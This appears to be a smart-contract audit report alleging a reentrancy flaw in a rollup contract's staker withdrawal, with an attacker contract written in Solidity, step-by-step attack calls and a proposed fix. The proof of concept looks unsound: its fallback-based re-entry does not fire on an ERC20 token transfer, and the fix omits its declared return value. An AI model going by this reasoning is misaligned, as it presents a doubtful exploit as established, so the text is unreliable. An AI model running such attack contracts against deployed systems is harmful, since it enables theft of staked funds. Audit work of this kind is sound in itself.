# Vulnerability details

## Impact
Calling safeTransfer after withdrawFunds could potentially open up reentrancy issues, although it's mentioned as safe.


## Proof of Concept
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableRollupUserLogic.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousContract {
    VulnerableRollupUserLogic public vulnerableContract;
    IERC20 public stakeToken;
    bool public attackInProgress;

    constructor(address _vulnerableContract, address _stakeToken) {
        vulnerableContract = VulnerableRollupUserLogic(_vulnerableContract);
        stakeToken = IERC20(_stakeToken);
    }

    // Fallback function to receive the tokens and trigger reentrancy
    fallback() external {
        if (attackInProgress) {
            vulnerableContract.withdrawStakerFunds();
        }
    }

    function attack() external {
        attackInProgress = true;
        vulnerableContract.withdrawStakerFunds();
    }

    function depositToVulnerableContract(uint256 amount) external {
        stakeToken.transferFrom(msg.sender, address(this), amount);
        stakeToken.approve(address(vulnerableContract), amount);
        vulnerableContract.deposit(amount);
    }
}
```
1. Deploy the Vulnerable Contract:
```
VulnerableRollupUserLogic vulnerableContract = new VulnerableRollupUserLogic(stakeTokenAddress);
```
2. Deploy the Malicious Contract:
```
MaliciousContract maliciousContract = new MaliciousContract(address(vulnerableContract), stakeTokenAddress);
```
3. Fund the Malicious Contract and Deposit to Vulnerable Contract:

```
// Transfer tokens to malicious contract
stakeToken.transfer(maliciousContractAddress, amount);

// Deposit tokens from malicious contract to vulnerable contract
maliciousContract.depositToVulnerableContract(amount);

```
4. Execute the Attack:

```
maliciousContract.attack();

```

## Recommended Mitigation Steps
```
function withdrawStakerFunds() external override whenNotPaused returns (uint256) {
    uint256 amount = balances[msg.sender];
    require(amount > 0, "NO_FUNDS_TO_WITHDRAW");
    balances[msg.sender] = 0; // Move this line before transfer to prevent reentrancy
    stakeToken.safeTransfer(msg.sender, amount);
}

```
